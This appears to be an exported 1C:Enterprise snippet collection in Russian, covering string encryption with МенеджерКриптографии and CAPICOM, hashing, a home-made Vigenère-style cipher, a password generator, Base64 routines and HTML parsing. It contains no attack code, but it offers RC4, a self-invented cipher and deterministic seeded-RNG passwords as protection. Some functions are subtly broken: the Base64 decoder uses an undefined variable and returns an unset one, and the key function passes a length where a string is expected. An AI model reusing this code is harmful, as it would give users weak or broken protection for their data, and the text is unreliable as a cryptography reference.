Асимметричное шифрование - использует два разных ключа: один для зашифрования (который также называется открытым), другой для расшифрования (называется закрытым).
Объект МенеджерКриптографии платформы 1С позволяет шифровать данные, используя симметричное шифрование, так как криптопровайдеры ОС Windows используют данный вид шифрования (RC2, RC4).

Создание временного сертификата

Для использования шифрования необходимо иметь сертификат. Создание сертификата описано в статье Создание временного сертификата для использования во время разработки. Сертификат необходимо создавать с параметром -sky exchange, иначе расшифрование сообщения будет завершаться ошибкой ""Модуль криптографии не поддерживает установку пароля к закрытому ключу"".

1. Ошибка установки пароля к закрытому ключу
Так же желательно создавать сертификат с параметром -sp, который позволит задать имя криптопровайдера для сертификата, например, ""Microsoft Strong Cryptographic Provider"", так как для инициализации объекта МенеджерКриптографии требуется в конструкторе указывать имя криптопровайдера (имя модуля провайдера).

Пример создания временного сертификата для тестирования шифрования в 1С:
makecert.exe -r -pe -n CN=""www.example.com"" -ss my -sr currentuser
-sky exchange -sp ""Microsoft Strong Cryptographic Provider""


2. Создание временного сертификата
Внимание: пароль на контейнер закрытого ключа при создании сертификата в данном случае не устанавливается!

Реализация шифрования

Функция шифрования строковых данных:
// Функция выполняет шифрование строковых данных.
//
// Параметры
//  СтроковыеДанные  - Строка - данные для шифрования;
//  Отпечаток  - Строка - отпечаток сертификата закодированный в Base64;
//  ИмяКП  - Строка - имя модкля криптографии;
//  ТипКП  - Строка - Тип модуля криптографии.
//
// Возвращаемое значение:
//   Строка   - зашифрованный данные формата PKCS#7 закодированные в Base64.
//
&НаКлиенте
Функция ЗашифроватьСтроку(СтроковыеДанные, Отпечаток, ИмяКП, ТипКП)
 
 ИмяВременногоФайла = ПолучитьИмяВременногоФайла();
 ЗаписьТекста = Новый ЗаписьТекста(ИмяВременногоФайла, ""CESU-8"");
 ЗаписьТекста.Записать(СтроковыеДанные);
 ЗаписьТекста.Закрыть();

 МенеджерКриптографии = Новый МенеджерКриптографии(ИмяКП, """", ТипКП);
 ХранилищеСертификатов = МенеджерКриптографии.ПолучитьХранилищеСертификатов(
  ТипХранилищаСертификатовКриптографии.ПерсональныеСертификаты,
  РасположениеХранилищаСертификатовКриптографии.ДанныеПользователяОС);
 Сертификат = ХранилищеСертификатов.НайтиПоОтпечатку(Base64Значение(Отпечаток));
 
 ЗашифрованныеДанные = МенеджерКриптографии.Зашифровать(ИмяВременногоФайла, Сертификат);
 
 УдалитьФайлы(ИмяВременногоФайла);
 
 Возврат Base64Строка(ЗашифрованныеДанные);

КонецФункции // ЗашифроватьСтроку()


В данной функции строковые данные записываются в файл в кодировке CESU-8, т.е. UTF-8 без BOM. Инициализируется менеджер криптографии и по отпечатку происходит поиск сертификата в хранилище сертификатов текущего пользователя в ветке Личное.

3. Личные сертификаты текущего пользователя
Далее происходит шифрование строковых данных, используя найденный сертификат, тем самым, расшифрование сможет произвести тот пользователь, который имеет доступ к закрытому ключу этого сертификата. Результатом шифрования являются двоичные данные, которые кодируются в строку Base64. Двоичные данные имеют формат PKCS#7.

Функция расшифрования строковых данных:
// Функция выполняет расшифровку строковых данных.
//
// Параметры
//  ЗашифрованныеДанные  - Строка - зашифрованный данные формата PKCS#7 закодированные в Base64;
//  Отпечаток  - Строка - отпечаток сертификата закодированный в Base64;
//  ПарольЗакрытогоКлюча  - Строка - пароль к контейнеру закрытого ключа;
//  ИмяКП  - Строка - имя модкля криптографии;
//  ТипКП  - Строка - Тип модуля криптографии.
//
// Возвращаемое значение:
//   Строка   - расшифрованные строковые данные.
//
&НаКлиенте
Функция РасшифроватьСтроку(ЗашифрованныеДанные, Отпечаток, ПарольЗакрытогоКлюча, ИмяКП, ТипКП)

 МенеджерКриптографии = Новый МенеджерКриптографии(ИмяКП, """", ТипКП); 
 МенеджерКриптографии.ПарольДоступаКЗакрытомуКлючу = ПарольЗакрытогоКлюча;
 
 РасшифрованныеДанные = МенеджерКриптографии.Расшифровать(Base64Значение(ЗашифрованныеДанные));
 
 ИмяВременногоФайла = ПолучитьИмяВременногоФайла();
 РасшифрованныеДанные.Записать(ИмяВременногоФайла); 
 ЧтениеТекста = Новый ЧтениеТекста(ИмяВременногоФайла, ""CESU-8"");
 СтрокаДанных = ЧтениеТекста.Прочитать();
 ЧтениеТекста.Закрыть();
 
 УдалитьФайлы(ИмяВременногоФайла);
 
 Возврат СтрокаДанных;

КонецФункции // РасшифроватьСтроку()


В данной функции инициализируется менеджер криптографии и указывается пароль к контейнеру закрытого ключа. Далее происходит расшифровка зашифрованных данных. Результатом расшифрования являются двоичные данные, которые записываются в файл с кодировкой CESU-8 и считываются из него.

Скачать обработку шифрования/расшифрования строковых данных можно по этой ссылке.

Пример работы обработки:

4. Шифрование и расшифрование сообщения
На рисунке 4 поле ""Пароль"" пустое, так как при создании временного сертификата мы не указывали пароль на контейнер закрытого ключа."}
},
{0,
{"Шифрование строковых данных с помощью CAPICOM.EncryptedData",0,0,"","Шифрование строковых данных с помощью CAPICOM.EncryptedData
Шифрование строковых данных. Менеджер криптографии.
Просмотр криптопровайдеров ОС Windows. Инициализация менеджера криптографии.
Шифрование строковых данных с помощью CAPICOM.EnvelopedData

Шифрование с помощью объекта EncryptedData библиотеки CAPICOM является самым простым в реализации, так как в данном случае не требует сертификатов и всего что с ними связано в отличии от объекта EnvelopedData и объекта МенеджераКриптографии языка 1С.

EncryptedData - объект, который предоставляет разработчику свойства и методы для шифрования/дешифрования некой информации с использованием секретного ключа. Этот объект поддерживает следующие симметричные алгоритмы: RC2, RC4, DES, 3DES. Общая схема симметричного шифрования:

1. Симметричное шифрование
Методы объекта:
Decrypt - выполняет дешифрование данных, используя секретный ключ;
Encrypt - выполняет шифрование данных, с применением секретного ключа;
SetSecret - устанавливает секретный ключ.
Свойства объекта:
Algorithm - алгоритм. используемый для шифрования/дешифрования;
Content - содержит данные для шифрования либо дешифрованные данные.

Функция шифрования:
// Функция выполняет шифрование строковых данных.
//
// Параметры
//  СтроковыеДанные  - Строка - данные для шифрования;
//  СекретныйКлюч  - Строка - ключ, при помощи которого производится дешифрование;
//
// Возвращаемое значение:
//   Строка   - зашифрованный данные закодированные в Base64.
//
Функция ЗашифроватьСтроку(Знач СтроковыеДанные, СекретныйКлюч)
 
 // Константы.
 ECAPICOM_ENCRYPTION_KEY_LENGTH_MAXIMUM = 0; // Максимальная длина ключа.
 CAPICOM_ENCRYPTION_ALGORITHM_RC4 = 1;  // Симметричный алгоритм шифрования RC4.
 CAPICOM_ENCODE_BASE64 = 0;     // Результат шифрование вернуть в формате Base64.
 
 // Инициализируем объект EncryptedData, задач длину ключа, алгоритм и данные для шифрования.
 EncryptedData = Новый COMОбъект(""CAPICOM.EncryptedData"");
 EncryptedData.Algorithm.KeyLength = ECAPICOM_ENCRYPTION_KEY_LENGTH_MAXIMUM;
 EncryptedData.Algorithm.Name = CAPICOM_ENCRYPTION_ALGORITHM_RC4;
 EncryptedData.Content = СтроковыеДанные; // нет времени кодировать в UTF-8.
 
 // Установим секретный ключ.
 EncryptedData.SetSecret(СекретныйКлюч);
 
 // Шифруем данные.
 Возврат EncryptedData.Encrypt(CAPICOM_ENCODE_BASE64);

КонецФункции // ЗашифроватьСтроку()

Функция дешифрования:
// Функция выполняет расшифровку строковых данных.
//
// Параметры
//  ЗашифрованныеДанные  - Строка - зашифрованный данные закодированные в Base64;
// СекретныйКлюч  - Строка - ключ, которым производилось шифрование.
//
// Возвращаемое значение:
//   Строка   - расшифрованные строковые данные.
//
Функция РасшифроватьСтроку(Знач ЗашифрованныеДанные, СекретныйКлюч)
 
 // Инициализируем объект EnvelopedData и выполняем дешифрацию.
 EncryptedData = Новый COMОбъект(""CAPICOM.EncryptedData"");
 EncryptedData.SetSecret(СекретныйКлюч);
 EncryptedData.Decrypt(ЗашифрованныеДанные);
 
 Возврат EncryptedData.Content;

КонецФункции // РасшифроватьСтроку()

Обработку можно скачать по этой ссылке.

2. Пример работы обработки
Как устанавливается библиотека CAPICOM и почему не стоит ею злоупотреблять описано в статье Вычисление хэш-сумм MD, SHA при помощи CAPICOM."}
},
{0,
{"Вычисление хэш-сумм MD, SHA при помощи CAPICOM",0,0,"","Вычисление хэш-сумм MD, SHA при помощи CAPICOM
Вычисление хэш-суммы по алгоритму SHA-512
Вычисление хэш-суммы по алгоритму MD5
Вычисление хэш-суммы по алгоритму ГОСТ Р 34.11-94

Установка CAPICOM

Компания Microsoft не советует использовать библиотеку CAPICOM, но без её COM-объектов обойтись трудно. Первым делом необходимо скачать Platform SDK CAPICOM. Этот пакет содержит свободно распространяемые файлы компоненты CAPICOM 2.1.0.1 и примеры её использования. CAPICOM можно использовать для электронной подписи данных и её проверки, хэширования данных, шифрования и расшифровки данных и т.д. После запуска скачанного пакета мастер установки произведет копирование файлов компоненты в указанную папку. В папке ...\Microsoft CAPICOM 2.1.0.2 SDK\Lib\X86 находится файл CAPICOM.dll который нужно зарегистрировать в системе, для этого запустите командную строку от имени администратор и выполните команду regsvr32 CAPICOM.dll:

Регистрация библиотеки CAPICOM
На этом установка закончена, можно приступать к использованию COM-объектов библиотеки CAPICOM в конфигурации :)

Реализация вычисления хэш-суммы

После регистрации библиотеки capicom.dll становится доступен COM-объект HashedData, у которого ProgID = CAPICOM.HashedData.1. Этот объект имеет метод Hash, в который будем передавать строку, и два свойства. Через свойство Algorithm указываем алгоритм вычисления хэш-суммы, а через свойство Value будем получать результат вызова метода Hash. Перед передачей строки в метод Hash производим приведение строки к кодировке UTF-8.

Список поддерживаемых алгоритмов и их значения (Algorithm):
SHA1 - CAPICOM_HASH_ALGORITHM_SHA1 (0);
MD2 - CAPICOM_HASH_ALGORITHM_MD2 (1);
MD4 - CAPICOM_HASH_ALGORITHM_MD4 (2);
MD5 - CAPICOM_HASH_ALGORITHM_MD5 (3);
SHA-256 - CAPICOM_HASH_ALGORITHM_SHA_256 (4);
SHA-384 - CAPICOM_HASH_ALGORITHM_SHA_384 (5);
SHA-512 - CAPICOM_HASH_ALGORITHM_SHA_512 (6).
Функция вычисления хэш-суммы на языке 1С:
// Функция вычисляет хэш-сумму по алгоритмам SHA и MD.
//
// Параметры
//  Строка  - Строка - исходная строка;
// Алгоритм - Число - алгоритм, по которому вычисляется хэш-сумма.
//
// Возвращаемое значение:
//   Строка   - хэш-сумма в виде N-символьной строке в шестнадцатеричном формате.
//
&НаСервереБезКонтекста
Функция ВычислитьХэшСумму(Строка, Алгоритм) Экспорт
 
 HashedData = Новый COMОбъект(""CAPICOM.HashedData.1"");
 // Указываем алгоритм хэширования.
 HashedData.Algorithm = Алгоритм;
 // Передаем данные, строку кодируем в последовательность байтов UTF-8.
 UTF8Encoding = Новый COMОбъект(""System.Text.UTF8Encoding"");
 HashedData.Hash(UTF8Encoding.GetBytes_4(Строка));
 
 // Возвращаем вычисленную хэш-сумму.
 Возврат HashedData.Value;

КонецФункции // ВычислитьХэшСумму()


Результат работы функции:

Хэш-сумма по алгоритму MD5 от значения 123
Хэш-сумма представляется в видет N-символьной строки в шестнадцатеричном виде.
Обработку можно скачать по этой ссылке.

Минус данной реализации таков: Microsoft  уходит от поддержки библиотеки CAPICOM и требуется установка данной библиотеки (если код будет выполняться на сервере, то у становка требуется только на машине, где установлен сервер 1С:Предприятие)"}
},
{0,
{"Обработка по шифрованию и расшифровке строковых полей справочников модифицированным методом Виженера",0,0,"","Обработка по шифрованию и расшифровке строковых полей справочников модифицированным методом Виженера - реализация без внешних компонент, без com-объектов, чистый 1С.
Хочу поделиться примером реализации обработки по шифрованию/расшифровке произвольных текстовых полей справочников. Требования перед разработкой я поставил следующие:

Должен быть реализован функционал шифрования и расшифровки по паролю;
Зашифрованные данные должны храниться в полях исходных данных, т.е. длина зашифрованного текста должна быть равной длине исходного текста, дополнительных таблиц быть не должно;
Список полей для шифрования/расшифровки должен быть настраиваемым и не зависеть от конфигурации;
Шифрование должно выполняться средствами платформы 1С без внешних компонент, com-объектов и т.д., чтобы исключить зависимость от ОС;
Решений на Инфостарте по шифрованию/расшифровки строк огромное множество (Защита и шифрование) - практически на любой вкус. Приведу наиболее интересные (на мой субъективный взгляд):

Подсистема шифрования данных + пример реализации: решение Keystore для хранения паролей;
Симметричное шифрование в 1С;
Шифрование текста, хеш сумма;
Хеширование данных с ключом по алгоритму SHA-1 штатными средствами 1С;
 Шифратор и дешифратор текста и файлов для 1С; 
Однако, найти публикацию, отвечающую всем моим требованиям, так и не удалось. Из-за наличия требования №2 (о не превышении длиной зашифрованного текста длины исходного текста), в качестве метода шифрования был выбран шифр Виженера.
Да, по современным стандартам данный шифр является ненадежным и поддается взлому. Поэтому, чтобы повысить время на дешифровку текста, в базовый алгоритм были внесены следующие улучшения:

Ключ для шифрования формируется на основании пароля, длина ключа шифрования равна длине шифруемого текста;
Код каждого символа ключа шифрования равен коду соответсвующего символа пароля, смещенного на псевдо случайную величину А;
Псевдо случайная величина А зависит от максимального кода среди символов пароля и длины кодируемой строки;
Код каждого символа зашифрованной строки равен сумме кода соответствующего символа исходной строки, кода соответствующего символа ключа шифрования и псевдо-случайной величины В;
Псевдо случайная величина В зависит от максимального кода среди символов ключа шифрования и длины кодируемой строки;
 Для генерации псевдо случайных величин использовался встроенный объект платформы ""ГенераторСлучайныхЧисел"". Ниже приведны основные функции обработки:

Функция ПолучитьМаксимальныйКодСимволаСтроки - получает максимальный код символа в переданной строке : 
Функция ПолучитьМаксимальныйКодСимволаСтроки(СтрокаАнализа)
	
	ДлинаСтрокиАнализа = СтрДлина(СтрокаАнализа);
	
	МаксимальныйКодСимвола = 0;
	
	Для Счетчик = 1 По ДлинаСтрокиАнализа Цикл
				
		КодТекущегоСимвола = КодСимвола(СтрокаАнализа, Счетчик);
		
		Если КодТекущегоСимвола > МаксимальныйКодСимвола Тогда
			
			МаксимальныйКодСимвола = КодТекущегоСимвола;
			
		КонецЕсли;
		
	КонецЦикла;
	
	Возврат МаксимальныйКодСимвола;
	
КонецФункции
Функция ПолучитьКлючШифрования - получает по паролю ключ шифрования с учетом псевдо случайного смещения:
Функция ПолучитьКлючШифрования(лПароль, ДлинаКодируемойСтроки)
	
	лПароль_Длина 	= СтрДлина(лПароль);
	КлючШифрования	= """";
	
	ЧислоДляИнциализацииГенератораСлучаныхЧисел = ПолучитьМаксимальныйКодСимволаСтроки(лПароль_Длина);
	
	ЧислоДляИнциализацииГенератораСлучаныхЧисел = ЧислоДляИнциализацииГенератораСлучаныхЧисел + ДлинаКодируемойСтроки;
	
	ГенераторСлучаныхЧисел = Новый ГенераторСлучайныхЧисел(ЧислоДляИнциализацииГенератораСлучаныхЧисел);
	
	СчетчикПоПаролю = Неопределено;
	
	Для Счетчик = 1 По ДлинаКодируемойСтроки Цикл
		
		Если (СчетчикПоПаролю = Неопределено) ИЛИ (СчетчикПоПаролю > лПароль_Длина) Тогда
			
			СчетчикПоПаролю = 1;
				
		КонецЕсли;
		
		СлучайноеСмещение = ГенераторСлучаныхЧисел.СлучайноеЧисло(1, ЧислоДляИнциализацииГенератораСлучаныхЧисел);
				
		СимволПароля = Сред(лПароль, СчетчикПоПаролю, 1);
		
		КлючШифрования = КлючШифрования + Символ(КодСимвола(СимволПароля) + СлучайноеСмещение);
		
		СчетчикПоПаролю = СчетчикПоПаролю + 1;
		
	КонецЦикла;
	
	Возврат КлючШифрования;
	
КонецФункции
Функция ЗашифроватьСтроку - шифрует строку шифром Виженера по ключу шифрования с учетом псевдо случайного смещения:
Функция ЗашифроватьСтроку(КодируемаяСтрока, КлючШифрования)
	
	ДлинаКодируемойСтроки = СтрДлина(КодируемаяСтрока);
	
	ЧислоДляИнциализацииГенератораСлучаныхЧисел = ПолучитьМаксимальныйКодСимволаСтроки(КлючШифрования);
	
	ЧислоДляИнциализацииГенератораСлучаныхЧисел = ЧислоДляИнциализацииГенератораСлучаныхЧисел + ДлинаКодируемойСтроки;
	
	ГенераторСлучаныхЧисел = Новый ГенераторСлучайныхЧисел(ЧислоДляИнциализацииГенератораСлучаныхЧисел);
	
	ЗакодированнаяСтрока = """";
	
	Для Счетчик = 1 ПО ДлинаКодируемойСтроки Цикл
		
		КодСимволаИсходнойСтроки 	= КодСимвола(КодируемаяСтрока, Счетчик);
		КодСимволаКлючаШифрования 	= КодСимвола(КлючШифрования, Счетчик);		
		СлучайнаяСоставляющая 		= ГенераторСлучаныхЧисел.СлучайноеЧисло(1, ЧислоДляИнциализацииГенератораСлучаныхЧисел);
		
		КодЗакодированныгоСимвола = КодСимволаИсходнойСтроки + КодСимволаКлючаШифрования + СлучайнаяСоставляющая;
		
		ЗакодированнаяСтрока = ЗакодированнаяСтрока + Символ(КодЗакодированныгоСимвола);
		
	КонецЦикла;
	
	Возврат ЗакодированнаяСтрока;
	
КонецФункции
Функция РасшифроватьСтроку - расшифровывает строку по ключу шифрования с учетом псевдо случайного смещения:
Функция РасшифроватьСтроку(КодируемаяСтрока, КлючШифрования)
	
	ДлинаКодируемойСтроки = СтрДлина(КодируемаяСтрока);
	
	ЧислоДляИнциализацииГенератораСлучаныхЧисел = ПолучитьМаксимальныйКодСимволаСтроки(КлючШифрования);
	
	ЧислоДляИнциализацииГенератораСлучаныхЧисел = ЧислоДляИнциализацииГенератораСлучаныхЧисел + ДлинаКодируемойСтроки;
	
	ГенераторСлучаныхЧисел = Новый ГенераторСлучайныхЧисел(ЧислоДляИнциализацииГенератораСлучаныхЧисел);
	
	ЗакодированнаяСтрока = """";
	
	Для Счетчик = 1 ПО ДлинаКодируемойСтроки Цикл
		
		КодСимволаКлючаШифрования 	= КодСимвола(КлючШифрования, Счетчик);			
		КодЗакодированныгоСимвола 	= КодСимвола(КодируемаяСтрока, Счетчик);
		СлучайнаяСоставляющая 		= ГенераторСлучаныхЧисел.СлучайноеЧисло(1, ЧислоДляИнциализацииГенератораСлучаныхЧисел);
		
		КодСимволаИсходнойСтроки = КодЗакодированныгоСимвола - КодСимволаКлючаШифрования - СлучайнаяСоставляющая;
		
		ЗакодированнаяСтрока = ЗакодированнаяСтрока + Символ(КодСимволаИсходнойСтроки);
		
	КонецЦикла;
	
	Возврат ЗакодированнаяСтрока;
	
КонецФункции
Функция ЗашифроватьРасшифроватьПолеОбъекта - получает ключ шифрования по паролю и шифрует или расшифровывает строку в зависимости от входных параметров:
Процедура ЗашифроватьРасшифроватьПолеОбъекта(ЗначениеРеквизита, Пароль, ЗаписатьЭлемент, ЭтоШифрование)
	
	Если НЕ ПустаяСтрока(ЗначениеРеквизита) Тогда
		
		КлючШифрования = ПолучитьКлючШифрования(Пароль, СтрДлина(ЗначениеРеквизита));
		
		Если ЭтоШифрование Тогда
			
			ЗначениеРеквизита = ЗашифроватьСтроку(ЗначениеРеквизита, КлючШифрования);
			
		Иначе
			
			ЗначениеРеквизита = РасшифроватьСтроку(ЗначениеРеквизита, КлючШифрования);
			
		КонецЕсли;
			
		Если НЕ ЗаписатьЭлемент Тогда
			
			ЗаписатьЭлемент = ИСТИНА;
			
		КонецЕсли;
		
	КонецЕсли;
	
КонецПроцедуры
Фактическая реализация алгоритма в виде обработки в приложенном файле. Интерфейс обработки интуитивно понятен. Для выполнения шифрования (или расшифровки) необходимо выполнить несколько простых шагов: 

Выбрать поля данных в базе для обработки (при нажатии на гиперссылку с надписью ""Обработать:"" открывается отдельная форма с деревом справочников конфигурации со всеми текстовыми реквизитами и табличными частями с текстовыми реквизитами;
Ввести пароль;
Ввести подтверждение пароля;
Нажать кнопку ""Зашифровать"" или ""Расшифровать"" в зависимости от требуемого действия. 
В качестве примера работы алгоритма приложены скриншоты со справочником ""Страны"" до шифрования и после шифрования.  На этом все, спасибо за внимание, надеюсь, кому-нибудь пригодится."}
},
{0,
{"JS (через window.crypto.getRandomValues)",0,0,"","var array = new Uint32Array(10);
window.crypto.getRandomValues(array);

console.log(""Your lucky numbers:"");
for (var i = 0; i < array.length; i++) {
    console.log(array[i]);
}"}
},
{0,
{"СгенерироватьПароль",0,0,"","//+++ Бовин А.
Функция СгенерироватьПароль(Знач ВходнаяСтрока)	Экспорт 

	Если НЕ ЗначениеЗаполнено(ВходнаяСтрока) Тогда
		ВходнаяСтрока = ""1111111"";	
	КонецЕсли;
	
	Пароль = """";
	Для Сч = 1 По СтрДлина(ВходнаяСтрока) Цикл
		
		Символ = Сред(ВходнаяСтрока,Сч,1);
		
		Попытка
			Число = Число(Символ);
		Исключение
		    Число = КодСимвола(Символ);
		КонецПопытки;
		
		ГСЧ = Новый ГенераторСлучайныхЧисел((Число+Сч)*Сч);
		Пароль = Пароль + Символ(ГСЧ.СлучайноеЧисло(33, 122));
	
	КонецЦикла;
	
	Возврат Пароль;
	
КонецФункции"}
},
{3,
{"Base64",1,0,"",""},
{0,
{"Через ПолучитьИмяВременногоФайла",0,0,"","//		Encoded 	- ДвоичныеДанные 	- Зашифрованный текс 
//		Кодировка 	- Строка 	- Кодировка: ANSI OEM UTF16 UTF8 Системная
Процедура Decode(Encoded, Кодировка)
	
	ДвДанные = Base64Значение(Encoded);
	Если ДвДанные = Неопределено Тогда
		Предупреждение(""Ошибка формата Base64"");
		Возврат;
	КонецЕсли;
	
	ВременныйФайл 	= ПолучитьИмяВременногоФайла();
	ДвДанные.Записать(ВременныйФайл);
	
	КодировкаФайла 	= Кодировка;
	КодировкаФайла 	= КодировкаТекста[Кодировка];
		
	Чтение 		= Новый ЧтениеТекста(ВременныйФайл, КодировкаФайла);
	Decoded 	= Чтение.Прочитать();
	Чтение.Закрыть();
	УдалитьФайлы(ВременныйФайл);
	
КонецПроцедуры

&НаКлиенте
Процедура Encode(Команда)
	
	КодировкаФайла 	= Кодировка;
	
	КодировкаФайла 	= КодировкаТекста[Кодировка];
	
	ВременныйФайл 	= ПолучитьИмяВременногоФайла();
	
	Запись 		= Новый ЗаписьТекста(ВременныйФайл, КодировкаФайла);
	Запись.Записать(Decoded);
	Запись.Закрыть();
	
	ДвДанные 	= Новый ДвоичныеДанные(ВременныйФайл);
	Encoded 	= Base64Строка(ДвДанные);
	
	УдалитьФайлы(ВременныйФайл);
	
КонецПроцедуры"}
},
{0,
{"Через ПотокВПамяти",0,0,"КодСтр","Функция КодироватьСтрокуBase64(пОбычнаяСтрока)
	
	СтрокаКодирования 	= пОбычнаяСтрока;
	
	ПотокВПамяти 	= Новый ПотокВПамяти();
	ЗаписьДанных 	= Новый ЗаписьДанных(ПотокВПамяти);
	ЗаписьДанных.ЗаписатьСтроку(СтрокаКодирования);
	
	ДД 				= ПотокВпамяти.ЗакрытьИПолучитьДвоичныеДанные();
	лРезультат 		= Base64Строка(ДД);
	
	Возврат лРезультат;
	
КонецФункции // КодироватьСтрокуBase64
 
Функция ДекодироватьСтрокуBase64(пСтрокаBase64)
	
	ДД1 			= Base64Значение(Строка);
	ЧтениеДанных 	= Новый ЧтениеДанных(ДД1);
	СтрокаРаскодированная 	= ЧтениеДанных.ПрочитатьСтроку();
	ЧтениеДанных.Закрыть();
	
	Возврат лРезультат;
	
КонецФункции // ДекодироватьСтрокуBase64
"}
},
{0,
{"Что-то ещё",0,0,"","&НаСервере
Функция Преобразовать64(Строка64 = неопределено, Массив64 = неопределено)
	Таб64 = Новый ТаблицаЗначений;
	Таб64.Колонки.Добавить(""Код"");
	Таб64.Колонки.Добавить(""Символ"");
	Нпп = 0;
	Для Код = КодСимвола(""A"") По КодСимвола(""Z"") Цикл
		стр = Таб64.Добавить();
		стр.Код = Нпп;
		стр.Символ = Символ(Код);
		Нпп = Нпп + 1;
	КонецЦикла;
	Для Код = КодСимвола(""a"") По КодСимвола(""z"") Цикл
		стр = Таб64.Добавить();
		стр.Код = Нпп;
		стр.Символ = Символ(Код);
		Нпп = Нпп + 1;
	КонецЦикла;
	стр = Таб64.Добавить();
	стр.Код = Нпп;
	стр.Символ = ""0"";
	Нпп = Нпп + 1;
	Для Код = 1 По 9 Цикл
		стр = Таб64.Добавить();
		стр.Код = Нпп;
		стр.Символ = Формат(Код,""ЧЦ=1; ЧДЦ=0"");
		Нпп = Нпп + 1;
	КонецЦикла;
	стр = Таб64.Добавить();
	стр.Код = Нпп;
	стр.Символ = ""+"";
	Нпп = Нпп + 1;
	стр = Таб64.Добавить();
	стр.Код = Нпп;
	стр.Символ = ""/"";
	
	Если Массив64 = неопределено Тогда 
		Если Строка64 = неопределено Тогда
			Сообщить(""неверный вызов функции"");
			Возврат неопределено;
		КонецЕсли;
		//Уберем переносы строк
		Строка64 = СтрЗаменить(Строка64, Символ(10), """");
		Строка64 = СтрЗаменить(Строка64, Символ(13), """");
		
		//преобразовываем строку в массив
		Если СтрДлина(Строка64) % 4 <> 0 Тогда
			Сообщить(""длина строки на входе должна быть кратна 4""); 
			Сообщить(СтрДлина(Строка64)); 
			Возврат неопределено;
		КонецЕсли;
		Кол4 = Цел(СтрДлина(Строка64) / 4);
		РазмерМ = Кол4 * 3;
		Если Прав(Строка64, 2) = ""=="" Тогда
			РазмерМ = РазмерМ - 2;
		ИначеЕсли Прав(Строка64, 1) = ""="" Тогда
			РазмерМ = РазмерМ - 1;
		КонецЕсли;            
		Массив64 = Новый Массив(РазмерМ);
		Для А = 1 По Кол4 Цикл
			Число3 = 0;
			Для Б = 1 По 4 Цикл
				Буква1 = Сред(Строка64, (А-1)*4 + Б, 1);    
				Если Буква1 = ""="" Тогда
					Код4 = 0;
				Иначе
					стрН = Таб64.Найти(Буква1, ""Символ"");
					Если стрН = Неопределено Тогда
						Сообщить(""ошибка при поиске ""+ КодСимвола(Буква1));    
					Иначе 
						Код4 = стрН.Код;
					КонецЕсли;
				КонецЕсли;
				Число3 = Число3 * 64 + Код4;
			КонецЦикла;
			Ост = Число3 % 256;
			Индекс = (А-1)*3 + 2;
			Если Индекс <= РазмерМ - 1 Тогда
				Массив64[Индекс] = Ост;
			КонецЕсли;
			Число3 = (Число3 - Ост) / 256;
			Ост = Число3 % 256;
			Индекс = (А-1)*3 + 1;
			Если Индекс <= РазмерМ - 1 Тогда
				Массив64[Индекс] = Ост;
			КонецЕсли;
			Число3 = (Число3 - Ост) / 256;
			Ост = Число3 % 256;
			Массив64[(А-1)*3 + 0] = Ост;
		КонецЦикла;
		Возврат Массив64;
	Иначе //Преобразовываем массив в строку
		Строка64 = """";
		Кол3 = Цел(Массив64.Количество() / 3);
		Если Массив64.Количество() % 3 <> 0 Тогда
			Кол3 = Кол3 + 1;
		КонецЕсли;
		Для А = 1 По Кол3 Цикл
			Число3 = Массив64[(А-1)*3];    
			Если (А-1)*3+1 <= Массив64.ВГраница() Тогда
				Код3 = Массив64[(А-1)*3+1];
			Иначе
				Код3 = 0;
			КонецЕсли;
			Число3 = Число3*256 + Код3;
			Если (А-1)*3+2 <= Массив64.ВГраница() Тогда
				Код3 = Массив64[(А-1)*3+2];
			Иначе
				Код3 = 0;
			КонецЕсли;
			Число3 = Число3*256 + Код3;
			
			Ост4 = Число3 % 64;
			Число3 = (Число3 - Ост4) / 64;
			Ост3 = Число3 % 64;
			Число3 = (Число3 - Ост3) / 64;
			Ост2 = Число3 % 64;
			Число3 = (Число3 - Ост2) / 64;
			Ост1 = Число3 % 64;
			Число3 = (Число3 - Ост1) / 64;
			стрН = Таб64.Найти(Ост1, ""Код"");
			Если стрН = неопределено Тогда
				Сообщить(""Ошибка при поиске"");
			Иначе
				Строка64 = Строка64 + стрН.Символ;
			КонецЕсли;
			стрН = Таб64.Найти(Ост2, ""Код"");
			Если стрН = неопределено Тогда
				Сообщить(""Ошибка при поиске"");
			Иначе
				Строка64 = Строка64 + стрН.Символ;
			КонецЕсли;
			стрН = Таб64.Найти(Ост3, ""Код"");
			Если стрН = неопределено Тогда
				Сообщить(""Ошибка при поиске"");
			Иначе
				Строка64 = Строка64 + стрН.Символ;
			КонецЕсли;
			стрН = Таб64.Найти(Ост4, ""Код"");
			Если стрН = неопределено Тогда
				Сообщить(""Ошибка при поиске"");
			Иначе
				Строка64 = Строка64 + стрН.Символ;
			КонецЕсли;
		КонецЦикла;
		//Если количество символов не делится на 3, то на конце должны быть
		//знаки ""=""
		Если Массив64.Количество() % 3 = 1 Тогда
			Строка64 = Лев(Строка64, СтрДлина(Строка64)-2)+ ""=="";    
		ИначеЕсли Массив64.Количество() % 3 = 2 Тогда
			Строка64 = Лев(Строка64, СтрДлина(Строка64)-1)+ ""="";    
		КонецЕсли;
		Возврат Строка64;
	КонецЕсли;
КонецФункции"}
}
}
},
{12,
{"HTML",1,0,"",""},
{0,
{"ПолучитьБлокиПоКлассу",0,0,"","Функция ПолучитьБлокиПоКлассу(Документ, Класс)
   
    МассивБлоков = Новый Массив;
   
    СписокЭлементов = Документ.ПолучитьЭлементыПоИмени(""div"");
    Для Каждого Элемент Из СписокЭлементов Цикл
        АтрибутКласс = Элемент.ПолучитьАтрибут(""class"");
        Если АтрибутКласс<>Неопределено Тогда
            Если АтрибутКласс=Класс Тогда
                МассивБлоков.Добавить(Элемент);
            КонецЕсли;
        КонецЕсли;
    КонецЦикла;
   
    Возврат МассивБлоков;
   
КонецФункции"}
},
{0,
{"ЧтениеHtml Пример",0,0,"","//возвращает первый тэг, у которого атрибут class равен ""content""
Чтение = Новый ЧтениеHtml;
Чтение.УстановитьСтроку(ДанныеТекущейСтраницы, ""UTF8"");
Построитель = Новый ПостроительDOM;
Документ = Построитель.Прочитать(Чтение);

Блоки = ПолучитьБлокиПоКлассу(Документ, ""content"");
Если Блоки.Количество()=0 Тогда
    Возврат Неопределено;
Иначе
    Возврат Блоки[0];
КонецЕсли;
"}
},
{0,
{"Пример большой 1",0,0,"","https://infostart.ru/public/88106/
